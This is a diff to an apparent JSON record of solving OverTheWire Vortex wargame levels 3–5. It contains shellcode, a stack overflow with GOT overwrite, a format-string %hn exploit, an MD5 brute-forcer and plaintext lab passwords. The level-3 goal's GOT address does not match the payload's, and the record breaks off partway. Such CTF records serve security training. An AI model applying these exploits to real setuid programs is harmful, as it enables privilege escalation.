@@ -2,7 +2,11 @@
  "goals": {
   "0": "Connect to the service on port 5842, sum the four uint32 values it sends, return the sum to receive the vortex1 credentials.",
   "1": "Get a shell from /vortex/vortex1: walk its cursor 261 backslashes to the saved frame pointer and send four raw 0xca bytes (the getchar hook only filters keyboard input, not a pipe) so the cursor's top byte becomes 0xca.",
-  "2": "Get the vortex3 password. /vortex/vortex2 (setuid vortex3) runs `tar cf /tmp/ownership.$$.tar <our args>`; with /etc/vortex_pass/vortex3 as the only argument tar archives the password file into a vortex3-owned archive we can copy and extract."
+  "2": "Get the vortex3 password. /vortex/vortex2 (setuid vortex3) runs `tar cf /tmp/ownership.$$.tar <our args>`; with /etc/vortex_pass/vortex3 as the only argument tar archives the password file into a vortex3-owned archive we can copy and extract.",
+  "3": "Get the vortex4 password. /vortex/vortex3 (setuid root) copies argv[1] into a 128-byte buffer and then writes the buffer address into the GOT slot named by lpp; put 69 bytes of NUL-free shellcode in the buffer and set lpp to exit's GOT slot (0x804b200), so the next call to exit jumps onto the executable stack.",
+  "4": "Get the vortex5 password. /vortex/vortex4 (setuid vortex5) calls printf(argv[3]), but with argc==1 and an empty argv[0] it reaches printf on envp[1]: the format string is the second environment variable. Two %hn writes through vararg slots 125 and 126 overwrite exit's GOT slot with the shellcode address, and exit jumps into 69 bytes of shellcode on the executable stack.",
+  "5": "Get the vortex6 password. /vortex/vortex5 (setuid vortex6) checks the MD5 of the entered password against a fixed digest; brute-force the 5-character alphanumeric preimage with a multiprocess search and use the password to get a shell as vortex6.",
+  "6": "Get the vortex7 password. /vortex/vortex6 (setuid vortex7) re-execs argv[0] as root; run it with argv[0] set to /bin/sh, so restart re-execs a shell with real uid vortex7."
  },
  "host": "vortex.labs.overthewire.org",
  "levels": [
@@ -928,6 +932,1804 @@
       "verified: login as vortex3 returned id"
      ],
      "note": "Password read from the archive in an interactive session (04:41-04:50): copy /tmp/ownership.$$.tar, extract, read etc/vortex_pass/vortex3 = xRMRVus8g. Verified: logging in as vortex3 with it in a fresh ssh session returns vortex3's uid and /etc/vortex_pass/vortex3 (xRMRVus8g)."
+    }
+   ]
+  },
+  {
+   "lvl": 3,
+   "pw": "TlI5kxGd1",
+   "user": "vortex3",
+   "steps": [
+    {
+     "cmd": "ssh vortex3@vortex.labs.overthewire.org -p 2228",
+     "out": [
+      "uid=5003(vortex3) gid=5003(vortex3) groups=5003(vortex3)"
+     ]
+    },
+    {
+     "cmd": "mkdir -p /tmp/l3rec && cd /tmp/l3rec && rm -f sc.asm sc.bin drv.c pay",
+     "out": []
+    },
+    {
+     "cmd": "vim sc.asm",
+     "text": "vim sc.asm -- the empty buffer",
+     "out": [
+      "  1",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "sc.asm                                                                            0,0-1          All",
+      "\"sc.asm\" [New]"
+     ]
+    },
+    {
+     "cmd": "vim sc.asm",
+     "text": "vim sc.asm -- insert chunk 1",
+     "out": [
+      "  1 BITS 32",
+      "  2     xor eax, eax",
+      "  3     push eax",
+      "  4     push 0x34786574",
+      "  5     push 0x726f762f",
+      "  6     push 0x73736170",
+      "  7     push 0x5f786574",
+      "  8     push 0x726f762f",
+      "  9     push 0x6374652f",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "sc.asm [+]                                                                        9,1            All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim sc.asm",
+     "text": "vim sc.asm -- insert chunk 2",
+     "out": [
+      "  1 BITS 32",
+      "  2     xor eax, eax",
+      "  3     push eax",
+      "  4     push 0x34786574",
+      "  5     push 0x726f762f",
+      "  6     push 0x73736170",
+      "  7     push 0x5f786574",
+      "  8     push 0x726f762f",
+      "  9     push 0x6374652f",
+      " 10     mov ebx, esp",
+      " 11     xor ecx, ecx",
+      " 12     mov al, 5",
+      " 13     int 0x80",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "sc.asm [+]                                                                        13,1           All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim sc.asm",
+     "text": "vim sc.asm -- insert chunk 3",
+     "out": [
+      "  1 BITS 32",
+      "  2     xor eax, eax",
+      "  3     push eax",
+      "  4     push 0x34786574",
+      "  5     push 0x726f762f",
+      "  6     push 0x73736170",
+      "  7     push 0x5f786574",
+      "  8     push 0x726f762f",
+      "  9     push 0x6374652f",
+      " 10     mov ebx, esp",
+      " 11     xor ecx, ecx",
+      " 12     mov al, 5",
+      " 13     int 0x80",
+      " 14     mov ebx, eax",
+      " 15     mov al, 3",
+      " 16     mov ecx, esp",
+      " 17     xor edx, edx",
+      " 18     mov dl, 100",
+      " 19     int 0x80",
+      " 20     mov edx, eax",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "sc.asm [+]                                                                        20,1           All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim sc.asm",
+     "text": "vim sc.asm -- insert chunk 4",
+     "out": [
+      "  1 BITS 32",
+      "  2     xor eax, eax",
+      "  3     push eax",
+      "  4     push 0x34786574",
+      "  5     push 0x726f762f",
+      "  6     push 0x73736170",
+      "  7     push 0x5f786574",
+      "  8     push 0x726f762f",
+      "  9     push 0x6374652f",
+      " 10     mov ebx, esp",
+      " 11     xor ecx, ecx",
+      " 12     mov al, 5",
+      " 13     int 0x80",
+      " 14     mov ebx, eax",
+      " 15     mov al, 3",
+      " 16     mov ecx, esp",
+      " 17     xor edx, edx",
+      " 18     mov dl, 100",
+      " 19     int 0x80",
+      " 20     mov edx, eax",
+      " 21     mov al, 4",
+      " 22     mov bl, 1",
+      " 23     mov ecx, esp",
+      " 24     int 0x80",
+      " 25     mov al, 1",
+      " 26     xor ebx, ebx",
+      " 27     int 0x80",
+      " 28",
+      "sc.asm [+]                                                                        28,1           All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim sc.asm",
+     "text": "vim sc.asm -- finished, before :wq",
+     "out": [
+      "  1 BITS 32",
+      "  2     xor eax, eax",
+      "  3     push eax",
+      "  4     push 0x34786574",
+      "  5     push 0x726f762f",
+      "  6     push 0x73736170",
+      "  7     push 0x5f786574",
+      "  8     push 0x726f762f",
+      "  9     push 0x6374652f",
+      " 10     mov ebx, esp",
+      " 11     xor ecx, ecx",
+      " 12     mov al, 5",
+      " 13     int 0x80",
+      " 14     mov ebx, eax",
+      " 15     mov al, 3",
+      " 16     mov ecx, esp",
+      " 17     xor edx, edx",
+      " 18     mov dl, 100",
+      " 19     int 0x80",
+      " 20     mov edx, eax",
+      " 21     mov al, 4",
+      " 22     mov bl, 1",
+      " 23     mov ecx, esp",
+      " 24     int 0x80",
+      " 25     mov al, 1",
+      " 26     xor ebx, ebx",
+      " 27     int 0x80",
+      " 28",
+      "sc.asm [+]                                                                        28,1           All",
+      "                                                                                         ^["
+     ]
+    },
+    {
+     "cmd": "wc -c sc.asm",
+     "out": [
+      "433 sc.asm"
+     ]
+    },
+    {
+     "cmd": "nasm -f bin -o sc.bin sc.asm && wc -c sc.bin",
+     "out": [
+      "69 sc.bin"
+     ]
+    },
+    {
+     "cmd": "xxd -p sc.bin | tr -d '\\n'; echo",
+     "out": [
+      "31c0506874657834682f766f726870617373687465785f682f766f72682f65746389e331c9b005cd8089c3b00389e131d2b264cd8089c2b004b30189e1cd80b00131dbcd80"
+     ]
+    },
+    {
+     "cmd": "xxd -p sc.bin | fold -w2 | grep -c '^00$' || echo NO-NUL-BYTES",
+     "out": [
+      "0",
+      "NO-NUL-BYTES"
+     ]
+    },
+    {
+     "cmd": "vim drv.c",
+     "text": "vim drv.c -- the empty buffer",
+     "out": [
+      "  1",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "drv.c                                                                             0,0-1          All",
+      "\"drv.c\" [New]"
+     ]
+    },
+    {
+     "cmd": "vim drv.c",
+     "text": "vim drv.c -- insert chunk 1",
+     "out": [
+      "  1 #include <unistd.h>",
+      "  2 #include <stdio.h>",
+      "  3 int main(int c, char **v){ static char buf[4096]; FILE *f=fopen(v[1],\"rb\");",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "drv.c [+]                                                                         3,1            All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim drv.c",
+     "text": "vim drv.c -- insert chunk 2",
+     "out": [
+      "  1 #include <unistd.h>",
+      "  2 #include <stdio.h>",
+      "  3 int main(int c, char **v){ static char buf[4096]; FILE *f=fopen(v[1],\"rb\");",
+      "  4 \t size_t n=fread(buf,1,sizeof buf-1,f); fclose(f); buf[n]=0;",
+      "  5 \t  char *a[]={\"/vortex/vortex3\", buf, 0}; execv(a[0],a); return 51; }",
+      "  6",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "drv.c [+]                                                                         6,1            All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim drv.c",
+     "text": "vim drv.c -- finished, before :wq",
+     "out": [
+      "  1 #include <unistd.h>",
+      "  2 #include <stdio.h>",
+      "  3 int main(int c, char **v){ static char buf[4096]; FILE *f=fopen(v[1],\"rb\");",
+      "  4 \t size_t n=fread(buf,1,sizeof buf-1,f); fclose(f); buf[n]=0;",
+      "  5 \t  char *a[]={\"/vortex/vortex3\", buf, 0}; execv(a[0],a); return 51; }",
+      "  6",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "drv.c [+]                                                                         6,1            All",
+      "                                                                                         ^["
+     ]
+    },
+    {
+     "cmd": "wc -c drv.c",
+     "out": [
+      "247 drv.c"
+     ]
+    },
+    {
+     "cmd": "gcc -o drv drv.c",
+     "out": []
+    },
+    {
+     "cmd": "python3 -c \"sc=open('sc.bin','rb').read(); open('pay','wb').write(sc+b'A'*(128-len(sc))+b'AAAA'+bytes([0x52,0x90,4,8]))\"",
+     "out": []
+    },
+    {
+     "cmd": "wc -c pay",
+     "out": [
+      "136 pay"
+     ]
+    },
+    {
+     "cmd": "./drv pay",
+     "out": [
+      "TlI5kxGd1"
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": [
+      "logout"
+     ]
+    },
+    {
+     "cmd": "ssh vortex4@vortex.labs.overthewire.org -p 2228",
+     "out": []
+    },
+    {
+     "cmd": "id",
+     "out": [
+      "uid=5004(vortex4) gid=5004(vortex4) groups=5004(vortex4)"
+     ]
+    },
+    {
+     "cmd": "cat /etc/vortex_pass/vortex4",
+     "out": [
+      "TlI5kxGd1"
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": [
+      "logout"
+     ]
+    }
+   ]
+  },
+  {
+   "lvl": 4,
+   "pw": "uwaRhgNq1",
+   "user": "vortex4",
+   "steps": [
+    {
+     "cmd": "ssh vortex4@vortex.labs.overthewire.org -p 2228",
+     "out": []
+    },
+    {
+     "cmd": "mkdir -p /tmp/l4rec && cd /tmp/l4rec && rm -f sc.asm sc.bin ex6.py gen.py fmt.bin",
+     "out": []
+    },
+    {
+     "cmd": "vim sc.asm",
+     "text": "vim sc.asm -- the empty buffer",
+     "out": [
+      "  1",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "sc.asm                                                                            0,0-1          All",
+      "\"sc.asm\" [New]"
+     ]
+    },
+    {
+     "cmd": "vim sc.asm",
+     "text": "vim sc.asm -- insert chunk 1",
+     "out": [
+      "  1 BITS 32",
+      "  2     xor eax, eax",
+      "  3     push eax",
+      "  4     push 0x35786574",
+      "  5     push 0x726f762f",
+      "  6     push 0x73736170",
+      "  7     push 0x5f786574",
+      "  8     push 0x726f762f",
+      "  9     push 0x6374652f",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "sc.asm [+]                                                                        9,1            All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim sc.asm",
+     "text": "vim sc.asm -- insert chunk 2",
+     "out": [
+      "  1 BITS 32",
+      "  2     xor eax, eax",
+      "  3     push eax",
+      "  4     push 0x35786574",
+      "  5     push 0x726f762f",
+      "  6     push 0x73736170",
+      "  7     push 0x5f786574",
+      "  8     push 0x726f762f",
+      "  9     push 0x6374652f",
+      " 10     mov ebx, esp",
+      " 11     xor ecx, ecx",
+      " 12     mov al, 5",
+      " 13     int 0x80",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "sc.asm [+]                                                                        13,1           All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim sc.asm",
+     "text": "vim sc.asm -- insert chunk 3",
+     "out": [
+      "  1 BITS 32",
+      "  2     xor eax, eax",
+      "  3     push eax",
+      "  4     push 0x35786574",
+      "  5     push 0x726f762f",
+      "  6     push 0x73736170",
+      "  7     push 0x5f786574",
+      "  8     push 0x726f762f",
+      "  9     push 0x6374652f",
+      " 10     mov ebx, esp",
+      " 11     xor ecx, ecx",
+      " 12     mov al, 5",
+      " 13     int 0x80",
+      " 14     mov ebx, eax",
+      " 15     mov al, 3",
+      " 16     mov ecx, esp",
+      " 17     xor edx, edx",
+      " 18     mov dl, 100",
+      " 19     int 0x80",
+      " 20     mov edx, eax",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "sc.asm [+]                                                                        20,1           All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim sc.asm",
+     "text": "vim sc.asm -- insert chunk 4",
+     "out": [
+      "  1 BITS 32",
+      "  2     xor eax, eax",
+      "  3     push eax",
+      "  4     push 0x35786574",
+      "  5     push 0x726f762f",
+      "  6     push 0x73736170",
+      "  7     push 0x5f786574",
+      "  8     push 0x726f762f",
+      "  9     push 0x6374652f",
+      " 10     mov ebx, esp",
+      " 11     xor ecx, ecx",
+      " 12     mov al, 5",
+      " 13     int 0x80",
+      " 14     mov ebx, eax",
+      " 15     mov al, 3",
+      " 16     mov ecx, esp",
+      " 17     xor edx, edx",
+      " 18     mov dl, 100",
+      " 19     int 0x80",
+      " 20     mov edx, eax",
+      " 21     mov al, 4",
+      " 22     mov bl, 1",
+      " 23     mov ecx, esp",
+      " 24     int 0x80",
+      " 25     mov al, 1",
+      " 26     xor ebx, ebx",
+      " 27     int 0x80",
+      " 28",
+      "sc.asm [+]                                                                        28,1           All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim sc.asm",
+     "text": "vim sc.asm -- finished, before :wq",
+     "out": [
+      "  1 BITS 32",
+      "  2     xor eax, eax",
+      "  3     push eax",
+      "  4     push 0x35786574",
+      "  5     push 0x726f762f",
+      "  6     push 0x73736170",
+      "  7     push 0x5f786574",
+      "  8     push 0x726f762f",
+      "  9     push 0x6374652f",
+      " 10     mov ebx, esp",
+      " 11     xor ecx, ecx",
+      " 12     mov al, 5",
+      " 13     int 0x80",
+      " 14     mov ebx, eax",
+      " 15     mov al, 3",
+      " 16     mov ecx, esp",
+      " 17     xor edx, edx",
+      " 18     mov dl, 100",
+      " 19     int 0x80",
+      " 20     mov edx, eax",
+      " 21     mov al, 4",
+      " 22     mov bl, 1",
+      " 23     mov ecx, esp",
+      " 24     int 0x80",
+      " 25     mov al, 1",
+      " 26     xor ebx, ebx",
+      " 27     int 0x80",
+      " 28",
+      "sc.asm [+]                                                                        28,1           All",
+      "                                                                                         ^["
+     ]
+    },
+    {
+     "cmd": "wc -c sc.asm",
+     "out": [
+      "433 sc.asm"
+     ]
+    },
+    {
+     "cmd": "nasm -f bin -o sc.bin sc.asm && wc -c sc.bin",
+     "out": [
+      "69 sc.bin"
+     ]
+    },
+    {
+     "cmd": "xxd -p sc.bin | tr -d '\\n'; echo",
+     "out": [
+      "31c0506874657835682f766f726870617373687465785f682f766f72682f65746389e331c9b005cd8089c3b00389e131d2b264cd8089c2b004b30189e1cd80b00131dbcd80"
+     ]
+    },
+    {
+     "cmd": "xxd -p sc.bin | fold -w2 | grep -c '^00$' || echo NO-NUL-BYTES",
+     "out": [
+      "0",
+      "NO-NUL-BYTES"
+     ]
+    },
+    {
+     "cmd": "vim ex6.py",
+     "text": "vim ex6.py -- the empty buffer",
+     "out": [
+      "  1",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "ex6.py                                                                            0,0-1          All",
+      "\"ex6.py\" [New]"
+     ]
+    },
+    {
+     "cmd": "vim ex6.py",
+     "text": "vim ex6.py -- insert chunk 1",
+     "out": [
+      "  1 import ctypes, sys, os",
+      "  2 fmt = open(\"fmt.bin\",\"rb\").read()",
+      "  3 argv = [b\"\"] + [None]",
+      "  4 env = [b\"PADPAD\", fmt] + [None]",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "ex6.py [+]                                                                        4,1            All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim ex6.py",
+     "text": "vim ex6.py -- insert chunk 2",
+     "out": [
+      "  1 import ctypes, sys, os",
+      "  2 fmt = open(\"fmt.bin\",\"rb\").read()",
+      "  3 argv = [b\"\"] + [None]",
+      "  4 env = [b\"PADPAD\", fmt] + [None]",
+      "  5 libc = ctypes.CDLL(\"libc.so.6\")",
+      "  6 ARGV = (ctypes.c_char_p * len(argv))(*argv)",
+      "  7 ENVP = (ctypes.c_char_p * len(env))(*env)",
+      "  8 libc.execve(sys.argv[1].encode(), ARGV, ENVP)",
+      "  9",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "ex6.py [+]                                                                        9,1            All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim ex6.py",
+     "text": "vim ex6.py -- finished, before :wq",
+     "out": [
+      "  1 import ctypes, sys, os",
+      "  2 fmt = open(\"fmt.bin\",\"rb\").read()",
+      "  3 argv = [b\"\"] + [None]",
+      "  4 env = [b\"PADPAD\", fmt] + [None]",
+      "  5 libc = ctypes.CDLL(\"libc.so.6\")",
+      "  6 ARGV = (ctypes.c_char_p * len(argv))(*argv)",
+      "  7 ENVP = (ctypes.c_char_p * len(env))(*env)",
+      "  8 libc.execve(sys.argv[1].encode(), ARGV, ENVP)",
+      "  9",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "ex6.py [+]                                                                        9,1            All",
+      "                                                                                         ^["
+     ]
+    },
+    {
+     "cmd": "wc -c ex6.py",
+     "out": [
+      "276 ex6.py"
+     ]
+    },
+    {
+     "cmd": "vim gen.py",
+     "text": "vim gen.py -- the empty buffer",
+     "out": [
+      "  1",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "gen.py                                                                            0,0-1          All",
+      "\"gen.py\" [New]"
+     ]
+    },
+    {
+     "cmd": "vim gen.py",
+     "text": "vim gen.py -- insert chunk 1",
+     "out": [
+      "  1 import sys",
+      "  2 sc = open(\"sc.bin\",\"rb\").read()",
+      "  3 assert b\"\\x00\" not in sc and len(sc) == 69",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "gen.py [+]                                                                        3,1            All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim gen.py",
+     "text": "vim gen.py -- insert chunk 2",
+     "out": [
+      "  1 import sys",
+      "  2 sc = open(\"sc.bin\",\"rb\").read()",
+      "  3 assert b\"\\x00\" not in sc and len(sc) == 69",
+      "  4 # exit@plt GOT slot 0x0804c008, +2 for the high half; the addresses sit at",
+      "  5 # fmt+6/fmt+10 where printf's varargs (slots 125/126) read them",
+      "  6 fmt = b\"XXXXXX\" + b\"\\x08\\xc0\\x04\\x08\" + b\"\\x0a\\xc0\\x04\\x08\" + b\"YYY\" + b\"%057229c%125$hn%073825c%126$hn\" + b\"N\"*5 + sc",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "gen.py [+]                                                                        6,1            All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim gen.py",
+     "text": "vim gen.py -- insert chunk 3",
+     "out": [
+      "  1 import sys",
+      "  2 sc = open(\"sc.bin\",\"rb\").read()",
+      "  3 assert b\"\\x00\" not in sc and len(sc) == 69",
+      "  4 # exit@plt GOT slot 0x0804c008, +2 for the high half; the addresses sit at",
+      "  5 # fmt+6/fmt+10 where printf's varargs (slots 125/126) read them",
+      "  6 fmt = b\"XXXXXX\" + b\"\\x08\\xc0\\x04\\x08\" + b\"\\x0a\\xc0\\x04\\x08\" + b\"YYY\" + b\"%057229c%125$hn%073825c%126$hn\" + b\"N\"*5 + sc",
+      "  7 assert len(fmt) == 121, len(fmt)",
+      "  8 open(\"fmt.bin\",\"wb\").write(fmt)",
+      "  9 print(\"fmt\", len(fmt))",
+      " 10",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "gen.py [+]                                                                        10,1           All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim gen.py",
+     "text": "vim gen.py -- finished, before :wq",
+     "out": [
+      "  1 import sys",
+      "  2 sc = open(\"sc.bin\",\"rb\").read()",
+      "  3 assert b\"\\x00\" not in sc and len(sc) == 69",
+      "  4 # exit@plt GOT slot 0x0804c008, +2 for the high half; the addresses sit at",
+      "  5 # fmt+6/fmt+10 where printf's varargs (slots 125/126) read them",
+      "  6 fmt = b\"XXXXXX\" + b\"\\x08\\xc0\\x04\\x08\" + b\"\\x0a\\xc0\\x04\\x08\" + b\"YYY\" + b\"%057229c%125$hn%073825c%126$hn\" + b\"N\"*5 + sc",
+      "  7 assert len(fmt) == 121, len(fmt)",
+      "  8 open(\"fmt.bin\",\"wb\").write(fmt)",
+      "  9 print(\"fmt\", len(fmt))",
+      " 10",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "gen.py [+]                                                                        10,1           All",
+      "                                                                                         ^["
+     ]
+    },
+    {
+     "cmd": "wc -c gen.py",
+     "out": [
+      "433 gen.py"
+     ]
+    },
+    {
+     "cmd": "python3 gen.py",
+     "out": [
+      "fmt 121"
+     ]
+    },
+    {
+     "cmd": "wc -c fmt.bin",
+     "out": [
+      "121 fmt.bin"
+     ]
+    },
+    {
+     "cmd": "xxd -p fmt.bin | head -c 60; echo",
+     "out": [
+      "58585858585808c004080ac0040859595925303537323239632531323524"
+     ]
+    },
+    {
+     "cmd": "python3 ex6.py /vortex/vortex4",
+     "out": [
+      "uwaRhgNq1"
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": [
+      "logout"
+     ]
+    },
+    {
+     "cmd": "ssh vortex5@vortex.labs.overthewire.org -p 2228",
+     "out": []
+    },
+    {
+     "cmd": "id",
+     "out": [
+      "uid=5005(vortex5) gid=5005(vortex5) groups=5005(vortex5)"
+     ]
+    },
+    {
+     "cmd": "cat /etc/vortex_pass/vortex5",
+     "out": [
+      "uwaRhgNq1"
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": [
+      "logout"
+     ]
+    }
+   ]
+  },
+  {
+   "lvl": 5,
+   "pw": "o5kBPzSFM",
+   "user": "vortex5",
+   "steps": [
+    {
+     "cmd": "ssh vortex5@vortex.labs.overthewire.org -p 2228",
+     "out": []
+    },
+    {
+     "cmd": "mkdir -p /tmp/l5rec && cd /tmp/l5rec && rm -f crack5.py",
+     "out": []
+    },
+    {
+     "cmd": "vim crack5.py",
+     "text": "vim crack5.py -- the empty buffer",
+     "out": [
+      "  1",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "crack5.py                                                                         0,0-1          All",
+      "\"crack5.py\" [New]"
+     ]
+    },
+    {
+     "cmd": "vim crack5.py",
+     "text": "vim crack5.py -- insert chunk 1",
+     "out": [
+      "  1 import hashlib, itertools, string, multiprocessing as mp",
+      "  2",
+      "  3 TARGET = bytes.fromhex('155fb95d04287b757c996d77b5ea51f7')",
+      "  4 ALNUM = string.ascii_letters + string.digits",
+      "  5",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "crack5.py [+]                                                                     5,1            All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim crack5.py",
+     "text": "vim crack5.py -- insert chunk 2",
+     "out": [
+      "  1 import hashlib, itertools, string, multiprocessing as mp",
+      "  2",
+      "  3 TARGET = bytes.fromhex('155fb95d04287b757c996d77b5ea51f7')",
+      "  4 ALNUM = string.ascii_letters + string.digits",
+      "  5",
+      "  6 def worker(first):",
+      "  7     # check short lengths for this first letter",
+      "  8     for L in range(1, 5):",
+      "  9         for t in itertools.product(ALNUM, repeat=L-1):",
+      " 10             s = first + ''.join(t)",
+      " 11             if hashlib.md5(s.encode()).digest() == TARGET:",
+      " 12                 return s",
+      " 13     # the 5-char space: this first letter + 4 more",
+      " 14     for t in itertools.product(ALNUM, repeat=4):",
+      " 15         s = first + ''.join(t)",
+      " 16         if hashlib.md5(s.encode()).digest() == TARGET:",
+      " 17             return s",
+      " 18     return None",
+      " 19",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "~",
+      "crack5.py [+]                                                                     19,1           All",
+      "-- INSERT --"
+     ]
+    },
+    {
+     "cmd": "vim crack5.py",
+     "text": "vim crack5.py -- insert chunk 3",
+     "out": [
+      "  2",
+      "  3 TARGET = bytes.fromhex('155fb95d04287b757c996d77b5ea51f7')",
+      "  4 ALNUM = string.ascii_letters + string.digits",
+      "  5",
+      "  6 def worker(first):",
+      "  7     # check short lengths for this first letter",
+      "  8     for L in range(1, 5):",
+      "  9         for t in itertools.product(ALNUM, repeat=L-1):",
+      " 10             s = first + ''.join(t)",
+      " 11             if hashlib.md5(s.encode()).digest() == TARGET:",
+      " 12                 return s",
+      " 13     # the 5-char space: this first letter + 4 more",
+      " 14     for t in itertools.product(ALNUM, repeat=4):",
